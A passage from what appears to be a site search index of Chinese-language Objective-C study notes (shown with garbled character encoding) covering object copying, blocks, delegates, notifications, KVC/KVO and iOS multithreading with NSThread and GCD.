@interface Dog : NSObject @property(nonatomic, retain) People *owner; @end   è§£å†³å¾ªç¯å¼•ç”¨ï¼Œåªéœ€è¦å°†å…¶ä¸­ä¸€ä¸ªæŒæœ‰æ”¹ä¸ºèµ‹å€¼å³å¯ï¼š\n@interface People : NSObjec @property(nonatomic, retain) Dog *dog; @end  @interface Dog : NSObject @property(nonatomic, assign) People *owner; @end   ARC #  ç³»ç»Ÿä¼šæ£€æµ‹å‡ºä½•æ—¶éœ€è¦ä¿æŒå¯¹è±¡ï¼Œä½•æ—¶éœ€è¦è‡ªåŠ¨é‡Šæ”¾å¯¹è±¡ï¼Œä½•æ—¶éœ€è¦é‡Šæ”¾å¯¹è±¡ï¼Œç¼–è¯‘å™¨ä¼šç®¡ç†å¥½å¯¹è±¡çš„å†…å­˜ï¼Œä¼šåœ¨ä½•æ—¶çš„åœ°æ–¹æ’å…¥ retain, release å’Œ autoreleaseï¼Œé€šè¿‡ç”Ÿæˆæ­£ç¡®çš„ä»£ç å»è‡ªåŠ¨é‡Šæ”¾æˆ–è€…ä¿æŒå¯¹è±¡ã€‚\nç›¸æ¯”äº MRCï¼ŒARC ä½¿ç”¨çš„æ˜¯ä»¥ä¸‹çš„å‡ ä¸ªå…³é”®è¯ï¼š\n ç”Ÿæˆä»ç„¶ä¿ç•™ allocã€newã€cpoyï¼› æŒæœ‰ä½¿ç”¨å…³é”®è¯ strongï¼ˆç›¸å¯¹äº MRC ä¸­çš„å…³é”®è¯ retainï¼‰ï¼› ä¸æŒæœ‰åˆ™ä½¿ç”¨å…³é”®è¯ weakï¼ˆç›¸å¯¹äº MRC ä¸­çš„å…³é”®è¯ assignï¼ŒåŒºåˆ«ï¼‰ï¼Œå½“å¯¹è±¡æ²¡æœ‰è¢«å¼ºæŒæœ‰æ—¶ç½®ä¸º nilï¼› é‡Šæ”¾ä¿ç•™äº†ä¹‹å‰çš„ä¸¤ä¸ªå…³é”®è¯ï¼Œå¼•å…¥äº†æ–°çš„å…³é”®è¯ deallocï¼Œå®ƒçš„å¥½å¤„æ˜¯æ— éœ€è¦é‡Šæ”¾çˆ¶ç±»ï¼›  ä¸¤ç§æ‹·è´åè®®ï¼š\n  NSCopyingï¼šè°ƒç”¨ copy æ–¹æ³•ï¼Œéœ€è¦å®ç° NSCopying åè®®ï¼Œå¦åˆ™ Crashã€‚æ¯”å¦‚ä¸‹é¢çš„è°ƒç”¨ï¼š\n@class People; @interface Dog : NSObject \u0026lt;NSCopying\u0026gt; @property(nonatomic, strong) NSString *name; @property(nonatomic, assign) NSInteger weight; @property(nonatomic, weak) People *owner;  @end  @implementation Dog - (id)copyWithZone:(nullable NSZone *)zone {  Dog *dog = [[Dog alloc] init];  dog.name = self.name;  dog.weight = self.weight;  dog.owner = self.owner;  return dog; } @end   NSMutableCopyingï¼šå­—ç¬¦ä¸²ã€æ•°ç»„ã€å­—å…¸ç­‰å¯¹è±¡ï¼Œéœ€è¦è¿›è¡Œæ·±æ‹·è´å¯¹è±¡ï¼Œéœ€è¦å®ç° NSMutableCopyingã€‚æ¯”å¦‚ä¸‹é¢çš„è°ƒç”¨ï¼š\n@class People; @interface Dog : NSObject \u0026lt;NSMutableCopying\u0026gt; @property(nonatomic, strong) NSString *name; @property(nonatomic, assign) NSInteger weight; @property(nonatomic, weak) People *owner;  @end  @implementation Dog - (id)mutableCopyWithZone:(nullable NSZone *)zone {  Dog *dog = [[Dog alloc] init];  dog.name = self.name;  dog.weight = self.weight;  dog.owner = self.owner;  return dog; } @end è¿™ä¸ªåè®®çš„å®ç°å¯ä»¥è®¾è®¡æˆ ä¸å¯å˜ä¸å¯å˜ ä¸¤ç§å½¢å¼ï¼Œå…¶åŒºåˆ«å°±åœ¨äºå¤–ç•Œæ˜¯å¦å¯ä»¥å¯¹å¯¹è±¡è¿›è¡Œä¿®æ”¹ï¼ˆæˆ‘æ„Ÿè§‰å°±ç±»ä¼¼äº c++ ä¸­çš„å¼•ç”¨ä¸å¸¸é‡å¼•ç”¨ï¼‰ã€‚\n  "},{"id":28,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/4.%E5%9D%97/","title":"4.å—","section":"Objective-C\u0026SDK","content":"å— #  æ¦‚å¿µ #  ä»€ä¹ˆæ˜¯ Blocksï¼Ÿ\n Blocks æ˜¯å¯¹ C è¯­è¨€çš„æ‰©å±•ï¼Œä¹Ÿå°±æ˜¯å¸¦æœ‰å±€éƒ¨å˜é‡çš„åŒ¿åå‡½æ•°ï¼› å®ƒçš„å¥½å¤„æ˜¯æ˜¯ä½¿å¾— Objective-C å¯ä»¥åƒ JavaScript ä¸€æ ·è¿›è¡Œå‡½æ•°å¼ç¼–ç¨‹ï¼›  Blocks çš„ä¸€äº›ç‰¹ç‚¹ï¼š\n å—å¯æ¥å—å‚æ•°ï¼Œä¹Ÿå¯è¿”å›å€¼ã€‚ å—å¯ä»¥åˆ†é…åœ¨æ ˆæˆ–å †ä¸Šï¼Œä¹Ÿå¯ä»¥æ˜¯å…¨å±€çš„ï¼Œåˆ†é…åœ¨æ ˆä¸Šçš„å—å¯æ‹·è´åˆ°å †é‡Œã€‚ å’Œæ ‡å‡†çš„ Objective-C å¯¹è±¡ä¸€æ ·ï¼Œå…·å¤‡å¼•ç”¨è®¡æ•°äº†ã€‚  å®šä¹‰å— #  å®šä¹‰ä¸€ä¸ªå—å¯¹è±¡åŸºç¡€çš„è¯­æ³•æ˜¯ï¼š\n^{  // Block implementation here }; Â å¾ˆæ˜¾ç„¶è¿™æ˜¯ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œå°±åƒ JavaScript ä¸€æ ·ï¼Œä¹Ÿå¯ä»¥åƒä¸‹é¢ä¸€æ ·ç›´æ¥æ‰§è¡Œï¼š\n^{  // Block implementation here }(); ä½†æ˜¯é€šå¸¸æˆ‘ä»¬å®šä¹‰ä¸€ä¸ª Blocks æ—¶ï¼Œé€šå¸¸æ˜¯éœ€è¦ä¸€ä¸ªåå­—çš„ï¼š\nvoid (^someBlock)() = ^{  // Block implementation here }; è¿™æ ·å®šä¹‰çš„å—å¯ä»¥é€šè¿‡åƒ C ä¸­çš„è¯­æ³•ä¸€æ ·è°ƒç”¨ï¼šsomeBlock()\nå¸¸è§é—®é¢˜ #  å—çš„å¼ºå¤§ä¹‹å¤„æ˜¯ï¼š\n  åœ¨å£°æ˜å®ƒçš„èŒƒå›´é‡Œã€‚æ‰€æœ‰å˜é‡éƒ½å¯ä»¥ä¸ºå…¶æ‰€æ•è·ã€‚è¿™ä¹Ÿå°±æ˜¯è¯´ï¼Œé‚£ä¸ªèŒƒå›´é‡Œçš„å…¨éƒ¨å˜é‡ï¼Œåœ¨å—é‡Œä¾ç„¶å¯ç”¨ã€‚\n  æ¯”å¦‚ï¼Œä¸‹é¢è¿™æ®µä»£ç æ‰€å®šä¹‰çš„å—ï¼Œå°±ä½¿ç”¨äº†å—ä»¥å¤–çš„å˜é‡ï¼š\nint additional = 5; int (^addBlock)(int a, int b) = ^(int a, int b){  return a + b + addItional; };  int add = addBlock(2, 5); // \u0026lt; add = 12   æˆ‘ä»¬ä¹Ÿå¯ä»¥ä¸ºå¸¸ç”¨çš„å—åˆ›å»º typedefï¼š\ntypedef void (^CompletionHandler)(void);  typedef int (^ComputeHandler)(int a, id b, NSObject *c); typedef NSObject * (^ComputeHandler)(int a, id b, NSObject *c); ä½†æ˜¯ blocks ä¸€èˆ¬æ˜¯ä¸å¯ä»¥ä¸»åŠ¨ä¿®æ”¹å±€éƒ¨å˜é‡çš„ï¼Œéœ€è¦ä¿®æ”¹çš„è¯åˆ™éœ€è¦æ·»åŠ  __block å…³é”®å­—ï¼š\n- (void)changeValue {  __block int value = 0;   void (^someBlock)(void) = ^{  NSLog(@\u0026#34;value:%i\u0026#34;, value); // value:1  value = 2;  };  value = 1;  someBlock();  NSLog(@\u0026#34;value:%i\u0026#34;, value); // value:2 } å¾ªç¯å¼•ç”¨ï¼š\n  å› ä¸ºå—ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå¦‚æœä½ åœ¨å—çš„ä»£ç å¼•ç”¨äº† self è¿™ä¸ªå˜é‡ï¼Œåˆ™ä¼šå¯¼è‡´å¾ªç¯å¼•ç”¨ã€‚æ¯”å¦‚ï¼š\n@interface ViewController () @property (nonatomic, copy) NSString *name; @property (nonatomic, strong) CompletionHandler handler; @end  @implementation ViewController  - (void)blocks {  self.handler = ^{  NSLog(@\u0026#34;%@\u0026#34;, self.name);  }; }  @end è¿™æ ·çš„å¾ªç¯å¼•ç”¨çš„ä»£ç ï¼Œæ˜¯ä¼šè¢« xcode æ£€æµ‹å‡ºæ¥çš„ã€‚\n  æˆ‘ä»¬å¯ä»¥å£°æ˜ä¸€ä¸ª __weak çš„å±€éƒ¨å˜é‡è§£å†³è¿™ä¸ªé—®é¢˜ï¼š\n@interface ViewController () @property (nonatomic, copy) NSString *name; @property (nonatomic, strong) CompletionHandler handler; @end  @implementation ViewController  - (void)blocks {  __weak __typeof(self)weakSelf = self;  self.handler = ^{  __strong __typeof(weakSelf)strongSelf = weakSelf;  NSLog(@\u0026#34;%@\u0026#34;, strongSelf.name);  }; }  @end   åœ¨ Objective-C ä¸­ï¼ŒNSArray æä¾›äº†ä¸€ä¸ªä¼ å…¥å—ä¾æ¬¡æ‰§è¡Œçš„å‡½æ•°ï¼Œå…¶åä¸º enumerateObjectsUsingBlockã€‚æ¯”å¦‚ä¸‹é¢æ˜¯ä¸€ä¸ªéå†æ•°ç»„çš„ç¤ºä¾‹ä»£ç ï¼š\nNSArray *array = @[@0, @1, @2, @3, @4, @5]; __block NSInteger count = 0; [array enumerateObjectsUsingBlock:^(NSNumber *number, NSUInteger idx, BooL *stop) {  if([number compare:@2] == NSOrderedAscending) {  count++;  } }] ; "},{"id":29,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/5.%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/","title":"5.é€šä¿¡æ–¹å¼","section":"Objective-C\u0026SDK","content":"é€šä¿¡æ–¹å¼ #  Delegate #  delegate æ˜¯å§”æ‰˜æ¨¡å¼ï¼Œå§”æ‰˜æ¨¡å¼æ˜¯å°†ä¸€ä»¶å±äºå§”æ‰˜è€…åšçš„äº‹æƒ…ï¼Œäº¤ç»™å¦å¤–ä¸€ä¸ªè¢«å§”æ‰˜è€…æ¥å¤„ç†ã€‚\nä¸€ä¸ªæ ‡å‡†çš„å§”æ‰˜ç”±ä»¥ä¸‹çš„éƒ¨åˆ†ç»„æˆï¼š\n@protocol FeederDelegate \u0026lt;NSObject\u0026gt; - (void)feed; @end  @interface People : NSObject\u0026lt;FeederDelegate\u0026gt; @end  @interface Dog : NSObject @property(nonatomic, weak) id\u0026lt;FeederDelegate\u0026gt; delegate; @end ä¹Ÿå°±æ˜¯è¯´ï¼ŒPeople æ˜¯ä¸€ä¸ªå¿…é¡»è¦æ»¡è¶³ Feeder è¿™ä¸ªåè®®çš„æ¨¡å‹ï¼Œé‚£ä¹ˆå®ƒå¿…é¡»å®ç°ä¸€ä¸ª feed å‡½æ•°ã€‚åœ¨ Dog è¿™ä¸ªå¯¹è±¡åˆ›å»ºçš„æ—¶å€™å¯ä»¥å°†å…¶ delegate æˆå‘˜ï¼š\n- (People *)createPeople {  People *people = [[People alloc] init];  Dog *dog = [[Dog alloc] init];  dog.delegate = people;\t// èµ‹å€¼ delegate å±æ€§  people.dog = dog;  return people; } æ¯”å¦‚æˆ‘ä»¬éœ€è¦æ•è·å¯¹äºä¸€ä¸ªæŒ‰é’®ç›¸åº”çš„åŠ¨ä½œäº‹ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢çš„ä¸¤æ­¥å®Œæˆï¼š\n  åœ¨åˆ›å»º Button æ—¶ï¼Œå°† UIControlEventTouchUpInside è¿™ä¸ªå¯¹è±¡ç»‘å®šä¸€ä¸ªåä¸º buttonHandler çš„å‡½æ•°ï¼š\n- (void)createButton {  UIButton *button = [[UIButton alloc] init];  [button addTarget:self action:@selector(buttonHandler:) forControlEvents:UIControlEventTouchUpInside]; }   ç„¶å buttonHandler åˆ™å¯ä»¥åœ¨æˆ‘ä»¬è‡ªå·±çš„ç±»ä¸­å®ç°ï¼š\n- (void)buttonHandler:(UIButton *)button {  // ç‚¹å‡»æŒ‰é’® }   Block #  å¯ä»¥é€šè¿‡ typedef å®šä¹‰ä¸€ä¸ª Block ç±»å‹ï¼Œç„¶åç±»ä¼¼åœ°å®ç°ã€‚æ¯”å¦‚ä¸‹é¢æ˜¯å®šä¹‰å’Œå®ç°ï¼š\ntypedef void (^FeedHandler)(void);  @class People; @interface Dog : NSObject @property (nonatomic, copy) FeedHandler handler; @end  @implementation Dog - (void)hungry {  if (self.handler != nil) {  self.handler();  } } @end ç„¶åå¯ä»¥ç”¨ä¸‹é¢çš„æ–¹å¼ç»™ Dog çš„ handler èµ‹å€¼ï¼š\n@implementation People  - (void)setDog:(Dog *)dog {  if (_dog != dog) { // åˆ¤æ–­ä¸åŒçš„dog  _dog = dog;  __weak __typeof(self)weakSelf = self;  _dog.handler = ^{  __strong __typeof(weakSelf)strongSelf = weakSelf;  [strongSelf cook];  [strongSelf feedPet];  [strongSelf clear];  };  } }  @end NSNotification #  å¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œå‰ä¸¤è€…å®ç°æ–¹å¼èƒ½è§£å†³å¤§éƒ¨åˆ†é—®é¢˜ï¼Œä½†æ˜¯æœ‰ä¸€äº›æƒ…å†µæ˜¯æ— æ³•è§£å†³çš„ï¼Œæ¯”å¦‚ï¼š\n ä¸€å¯¹å¤šã€‚ä¾èµ–å…³é”®è¿œï¼ˆæ¯”å¦‚ä¸¤ä¸ªé¡µé¢é—´çš„é€šä¿¡ï¼‰  äºæ˜¯éœ€è¦ç”¨åˆ° NSNotification è¿™æ ·ä¸€ä¸ªé€šçŸ¥ç³»ç»Ÿï¼Œè¿™ä¸ªé€šçŸ¥ç³»ç»Ÿçš„ä½¿ç”¨ä¸»è¦æœ‰ä»¥ä¸‹ä¸‰æ­¥ï¼š\n  æ·»åŠ é€šçŸ¥ï¼š\n[[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(notificationFirst:) name:@\u0026#34;people.name\u0026#34; object:nil];   ä¸Šé¢çš„ notificationFirst å°±æ˜¯ä¸€ä¸ªç±»è‡ªå·±å®ç°çš„å›è°ƒæ–¹æ³•ï¼š\n- (void)notificationFirst:(NSNotification *)notification {  NSLog(@\u0026#34;people.nameï¼š%@\u0026#34;, notification.object); // people.nameï¼šå°ç‹ }   åœ¨å…¶ä»–åœ°æ–¹å‘é€é€šçŸ¥ï¼Œåˆ™è¿™ä¸ªç±»åˆ™ä¼šæ”¶åˆ°ç›¸åº”ï¼š\n[[NSNotificationCenter defaultCenter] postNotificationName:@\u0026#34;people.name\u0026#34; object:@\u0026#34;å°ç‹\u0026#34;];   KVC \u0026amp;\u0026amp; KVO #  ä»€ä¹ˆæ˜¯ KVCï¼Ÿ\n  KVCï¼šKey-Value Codingï¼Œå³é”®å€¼ç¼–ç ã€‚\n  å®ƒæ˜¯ä¸€ç§ä¸é€šè¿‡å­˜å–æ–¹æ³•ï¼Œè€Œé€šè¿‡å±æ€§åç§°å­—ç¬¦ä¸²é—´æ¥è®¿é—®å±æ€§çš„æœºåˆ¶ã€‚\n  å–å€¼å’Œèµ‹å€¼å®ç°äº†ä¸‹é¢çš„ä¸¤ä¸ªå‡½æ•°ï¼š\n-(void)setValue:(nullable id)value forKey:(NSString *)key; -(nullable id)valueForKey:(NSString *)key;   é™¤æ­¤ä¹‹å¤–ï¼ŒKVC ä¹Ÿæä¾›äº†ä¼ å…¥è·¯å¾„è¿›è¡Œè®¿é—®çš„æ–¹æ³•ï¼š\n  -(nullable id)valueForKeyPath:(NSString *)keyPath; -(void)setValue:(nullable id)value forKeyPath:(NSString *)keyPath; æ¯”å¦‚ä¼ å…¥ student.nameï¼Œå°±è¡¨ç¤º student å±æ€§é‡Œçš„ name å±æ€§\n  ä»€ä¹ˆæ˜¯ KVOï¼Ÿ\n Key-Value Obersverï¼Œå³é”®å€¼è§‚å¯Ÿã€‚å®ƒæ˜¯è§‚å¯Ÿè€…æ¨¡å¼çš„ä¸€ç§è¡ç”Ÿã€‚ åŸºæœ¬æ€æƒ³æ˜¯ï¼Œå¯¹ç›®æ ‡å¯¹è±¡çš„æŸå±æ€§æ·»åŠ è§‚å¯Ÿï¼Œå½“è¯¥å±æ€§å‘ç”Ÿå˜åŒ–æ—¶ï¼Œä¼šè‡ªåŠ¨çš„é€šçŸ¥è§‚å¯Ÿè€…ã€‚è¿™é‡Œæ‰€è°“çš„é€šçŸ¥æ˜¯è§¦å‘è§‚å¯Ÿè€…å¯¹è±¡å®ç°çš„ KVO çš„æ¥å£æ–¹æ³•ã€‚  ä¸‹é¢è®²ä¸€ä¸ª KVO çš„ä¾‹å­ï¼š\n  é¦–å…ˆç»™ç›®æ ‡å¯¹è±¡çš„å±æ€§æ·»åŠ è§‚å¯Ÿï¼Œä¸‹é¢æ˜¯è¿™ä¸ªæ–¹æ³•çš„åŸå‹ï¼š\n- (void)addObserver:(NSObject *)observer forKeyPath:(NSString *)keyPath options:(NSKeyValueObservingOptions)options context:(nullable void *)context; å…¶ä¸­ï¼ŒNSKeyValueObservingOptions æ˜¯ä¸€ä¸ªæšä¸¾å¸¸é‡ï¼š\nNSKeyValueObservingOptions: \tNSKeyValueObservingOptionNew // æä¾›æ›´æ”¹å‰çš„å€¼ \tNSKeyValueObservingOptionOld // æä¾›æ›´æ”¹åçš„å€¼ \tNSKeyValueObservingOptionInitial // è§‚å¯Ÿæœ€åˆçš„å€¼ï¼ˆåœ¨æ³¨å†Œè§‚å¯ŸæœåŠ¡æ—¶ä¼šè°ƒç”¨ä¸€æ¬¡è§¦å‘æ–¹æ³•ï¼‰ \tNSKeyValueObservingOptionPrior // åˆ†åˆ«åœ¨å€¼ä¿®æ”¹å‰åè§¦å‘æ–¹æ³•ï¼ˆå³ä¸€æ¬¡ä¿®æ”¹æœ‰ä¸¤æ¬¡è§¦å‘ï¼‰   å®ç°ä¸‹é¢æ–¹æ³•æ¥æ¥æ”¶é€šçŸ¥ï¼Œéœ€è¦æ³¨æ„å„ä¸ªå‚æ•°çš„å«ä¹‰ï¼š\n- (void)observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object change:(NSDictionary\u0026lt;NSString *,id\u0026gt; *)change context:(void *)context   æœ€åè¦ç§»é™¤è§‚å¯Ÿè€…ï¼š\n- (void)observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object change:(NSDictionary\u0026lt;NSString *,id\u0026gt; *)change context:(void *)context   "},{"id":30,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/6.%E5%A4%9A%E7%BA%BF%E7%A8%8B/","title":"6.å¤šçº¿ç¨‹","section":"Objective-C\u0026SDK","content":"å¤šçº¿ç¨‹ #  iOS çº¿ç¨‹æ¦‚è¿° #  ä¸»çº¿ç¨‹ï¼š\n iOS App è¿è¡Œåï¼Œé»˜è®¤ä¼šå¼€å¯ 1 æ¡çº¿ç¨‹ï¼Œç§°ä¸ºâ€œä¸»çº¿ç¨‹â€æˆ–â€œUIçº¿ç¨‹â€ ä¸»çº¿ç¨‹å¤„ç† UI äº‹ä»¶ï¼ˆæ¯”å¦‚ç‚¹ã€æ»‘åŠ¨ã€æ‹–æ‹½ç­‰ç­‰ï¼‰å’Œæ˜¾ç¤ºã€åˆ·æ–° UI ç•Œé¢  iOS çš„çº¿ç¨‹ç›¸å…³æŠ€æœ¯ä¸»è¦æœ‰ä»¥ä¸‹å››ç§ï¼š\n   æŠ€æœ¯æ–¹æ¡ˆ ç‰¹ç‚¹ è¯­è¨€ çº¿ç¨‹ç”Ÿå‘½å‘¨æœŸ     pthread ä¸€å¥—é€šç”¨çš„å¤šçº¿ç¨‹ API\né€‚ç”¨äº Unix/Linux/Windows ç³»ç»Ÿ\nè·¨å¹³å°ã€å¯ç§»æ¤ã€ä½¿ç”¨éš¾åº¦å¤§ C ç¨‹åºå‘˜ç®¡ç†   NSThread ä½¿ç”¨é¢å‘å¯¹è±¡ç¼–ç¨‹\nç®€å•æ˜“ç”¨ï¼Œå¯ä»¥ç›´æ¥æ“ä½œçº¿ç¨‹å¯¹è±¡ Objective-C ç¨‹åºå‘˜ç®¡ç†   GCD æ—¨åœ¨æ›¿ä»£å‰é¢ä¸¤ç§çš„çº¿ç¨‹æŠ€æœ¯\nå……åˆ†åˆ©ç”¨è®¾å¤‡çš„å¤šæ ¸ç‰¹æ€§ C è‡ªåŠ¨ç®¡ç†   NSOperation åŸºäº GCDï¼ŒåŠ å…¥ä¸€äº›ç®€å•å®ç”¨çš„åŠŸèƒ½\nå†…å®¹æ›´åŠ é¢å‘å¯¹è±¡ Objective-C è‡ªåŠ¨ç®¡ç†    å¤šçº¿ç¨‹çš„ä¼˜ç¼ºç‚¹ï¼š\n ä¼˜ç‚¹æ˜¯å¾ˆæ˜¾ç„¶çš„ï¼šèƒ½é€‚å½“æå‡ç¨‹åºçš„æ‰§è¡Œæ•ˆç‡ï¼›èƒ½é€‚å½“æå‡èµ„æºåˆ©ç”¨ç‡ï¼ˆCPUã€å†…å­˜ç­‰ï¼‰ ç¼ºç‚¹ï¼š  åˆ›å»ºçº¿ç¨‹æ˜¯æœ‰å¼€é”€çš„ï¼Œæ¯”å¦‚ iOS çš„å¼€é”€ä¸»è¦æœ‰ï¼ˆå†…æ ¸æ•°æ®ç»“æ„å¤§çº¦ 1KBï¼Œæ ˆç©ºé—´ï¼Œåˆ›å»ºæ—¶é—´ 90msï¼‰ å¦‚æœå¼€å¯å¤§é‡çš„çº¿ç¨‹ï¼Œä¼šé™ä½ç¨‹åºçš„æ€§èƒ½ã€å¢åŠ  CPU åœ¨çº¿ç¨‹è°ƒåº¦ä¸Šçš„å¼€é”€ã€ç¨‹åºè®¾è®¡æ›´åŠ å¤æ‚ã€‚    NSThread #  ä»€ä¹ˆæ˜¯ NSThreadï¼Ÿ\n NSThread æ˜¯ç»è¿‡ Apple å°è£…çš„é¢å‘å¯¹è±¡çš„ï¼Œå®ƒå…è®¸å¼€å‘è€…ç›´æ¥ä»¥é¢å‘å¯¹è±¡çš„æ€æƒ³å¯¹çº¿ç¨‹è¿›è¡Œæ“ä½œã€‚æ¯ä¸€ä¸ª NSThread å¯¹è±¡å°±ä»£è¡¨ä¸€æ¡çº¿ç¨‹ï¼Œä½†æ˜¯å¼€å‘è€…å¿…é¡»æ‰‹åŠ¨ç®¡ç†çº¿ç¨‹çš„ç”Ÿå‘½å‘¨æœŸï¼Œè¿™ç‚¹æ˜¯ Apple ä¸æå€¡çš„ã€‚  ä¸‹é¢æ˜¯ä¸€ä¸ªåˆ©ç”¨è¿™ä¸ªç±»çš„å®ä¾‹ï¼š\nNSThread *thread = [[NSThread alloc] initWithTarget:self selector:@selector(run) object:nil]; [thread start]; è¿™ä¸ªç±»å¸¸è§çš„æ–¹æ³•å¦‚ä¸‹æ‰€ç¤ºï¼š\n[NSThread mainThread];\t// è·å–ä¸»çº¿ç¨‹ [NSThread currentThread]; // è·å–å½“å‰çº¿ç¨‹ [NSThread exit]; // é€€å‡ºçº¿ç¨‹ [thread cancel]; // å–æ¶ˆçº¿ç¨‹ [NSThread isMainThread]; // åˆ¤æ–­æ˜¯å¦ä¸ºå¤šçº¿ç¨‹ åˆ›å»ºä¸€ä¸ªæ–°çš„å¤šçº¿ç¨‹è¿˜æœ‰å…¶ä»–çš„åˆ›å»ºæ–¹å¼ï¼š\n[NSThread detachNewThreadSelector:@selector(run) toTarget:self withObject:nil]; [self performSelectorInBackground:@selector(run) withObject:nil]; GCD \u0026amp;\u0026amp; NSOperation #  GCD #  GCDï¼šGrand Central Dispatchã€‚\n å®ƒå¯ç”¨äºå¤šæ ¸çš„å¹¶è¡Œè¿ç®—ï¼Œè‡ªåŠ¨åˆ©ç”¨æ›´å¤šçš„ CPU å†…æ ¸ï¼Œè‡ªåŠ¨ç®¡ç†çš„çº¿ç¨‹ç”Ÿå‘½å‘¨æœŸã€‚  åŒæ­¥æ‰§è¡Œä¸å¼‚æ­¥æ‰§è¡Œï¼š\n  åŒæ­¥ï¼šåŒæ­¥æ·»åŠ ä»»åŠ¡åˆ°æŒ‡å®šçš„é˜Ÿåˆ—ä¸­ï¼Œåœ¨æ·»åŠ çš„ä»»åŠ¡æ‰§è¡Œç»“æŸä¹‹å‰ï¼Œä¼šä¸€ç›´ç­‰å¾…ï¼Œç›´åˆ°é˜Ÿåˆ—é‡Œé¢çš„ä»»åŠ¡å®Œæˆä¹‹åå†ç»§ç»­æ‰§è¡Œã€‚åªèƒ½åœ¨å½“å‰çº¿ç¨‹ä¸­æ‰§è¡Œä»»åŠ¡ï¼Œä¸å…·å¤‡å¼€å¯æ–°çº¿ç¨‹çš„èƒ½åŠ›ã€‚\nä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨åŒæ­¥æ‰§è¡Œä»»åŠ¡çš„ä¾‹å­ï¼š\ndispatch_queue_t queue = dispatch_get_main_queue(); dispatch_sync(queue, ^{  // æƒ³æ‰§è¡Œçš„ä»»åŠ¡ });   å¼‚æ­¥ï¼šå¼‚æ­¥æ·»åŠ ä»»åŠ¡åˆ°æŒ‡å®šçš„é˜Ÿåˆ—ä¸­ï¼Œå®ƒä¸ä¼šåšä»»ä½•ç­‰å¾…ï¼Œå¯ä»¥ç»§ç»­æ‰§è¡Œä»»åŠ¡ã€‚å¯ä»¥åœ¨æ–°çš„çº¿ç¨‹ä¸­æ‰§è¡Œä»»åŠ¡ï¼Œå…·å¤‡å¼€å¯æ–°çº¿ç¨‹çš„èƒ½åŠ›ã€‚\nä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨å¼‚æ­¥æ‰§è¡Œä»»åŠ¡çš„ä¾‹å­ï¼š\ndispatch_queue_t queue = dispatch_get_main_queue(); dispatch_async(queue, ^{  // æƒ³æ‰§è¡Œçš„ä»»åŠ¡ });   Dispatch Queue æ˜¯æ‰§è¡Œå¤„ç†çš„ç­‰å¾…é˜Ÿåˆ—ã€‚ä¸»è¦æœ‰ä»¥ä¸‹ä¸¤ç§ï¼š\n  Serial Queueï¼šä¸²è¡Œé˜Ÿåˆ—ï¼Œä¹Ÿç§°ä¸ºç§æœ‰è°ƒåº¦é˜Ÿåˆ—ã€‚æŒ‰é¡ºåºå°†å…¶ä¸­ä¸€ä¸ªä»»åŠ¡æ·»åŠ åˆ°é˜Ÿåˆ—ä¸­ï¼Œå¹¶ä¸”ä¸€æ¬¡åªæ‰§è¡Œä¸€ä¸ªä»»åŠ¡ã€‚ä¸€ä¸ªä¸²è¡Œé˜Ÿåˆ—ä½¿ç”¨ä¸€ä¸ªçº¿ç¨‹ã€‚\nä¸‹é¢æ˜¯ç”Ÿæˆä¸€ä¸ªä¸²è¡Œé˜Ÿåˆ—ï¼Œå¹¶ä¸”ä½¿ç”¨çš„ç¤ºä¾‹ä»£ç ï¼š\ndispatch_queue_t queue = dispatch_queue_create(\u0026#34;MySerialDiapatchQueue\u0026#34;, DISPATCH_QUEUE_SERIAL);  dispatch_async(queue, ^{ NSLog(@\u0026#34;thread1\u0026#34;); }); dispatch_async(queue, ^{ NSLog(@\u0026#34;thread2\u0026#34;); }); dispatch_async(queue, ^{ NSLog(@\u0026#34;thread3\u0026#34;); });   Concurrent Queueï¼šå¹¶è¡Œé˜Ÿåˆ—ï¼Œä¹Ÿç§°ä¸ºå…¨å±€è°ƒåº¦é˜Ÿåˆ—ã€‚åŒæ—¶æ‰§è¡Œä¸€ä¸ªæˆ–å¤šä¸ªä»»åŠ¡ï¼Œä½†ä»»åŠ¡ä»ç„¶æŒ‰ç…§å®ƒä»¬æ·»åŠ åˆ°é˜Ÿåˆ—çš„é¡ºåºæ‰§è¡Œã€‚\nä¸‹é¢æ˜¯ç”Ÿæˆä¸€ä¸ªå¹¶è¡Œé˜Ÿåˆ—ï¼Œå¹¶ä¸”ä½¿ç”¨çš„ç¤ºä¾‹ä»£ç ï¼š\ndispatch_queue_t queue = dispatch_queue_create(\u0026#34;MyConcurrentDiapatchQueue\u0026#34;, DISPATCH_QUEUE_CONCURRENT);  dispatch_async(queue, ^{ NSLog(@\u0026#34;thread1\u0026#34;); }); dispatch_async(queue, ^{ NSLog(@\u0026#34;thread2\u0026#34;); }); dispatch_async(queue, ^{ NSLog(@\u0026#34;thread3\u0026#34;); });   å¦å¤–ï¼Œç³»ç»Ÿä¸ºæ¯ä¸ªåº”ç”¨ç¨‹åºæä¾›äº†ä¸€ä¸ªä¸»è°ƒåº¦é˜Ÿåˆ—å’Œå››ä¸ªå¹¶å‘è°ƒåº¦é˜Ÿåˆ—ã€‚è¿™äº›é˜Ÿåˆ—å¯¹åº”ç”¨ç¨‹åºè€Œè¨€æ˜¯å…¨å±€çš„ï¼Œè€Œä¸”åªå¯¹å®ƒä»¬çš„ä¼˜å…ˆçº§è¿›è¡ŒåŒºåˆ†ã€‚æˆ‘ä»¬ä¸éœ€è¦åˆ›å»ºå®ƒä»¬ï¼Œå¯ä»¥ç”¨ dispatch_get_global_queue å‡½æ•°çš„è·å–å…¶ä¸­ä¸€ä¸ªé˜Ÿåˆ—ï¼š\n  Main Dispatch 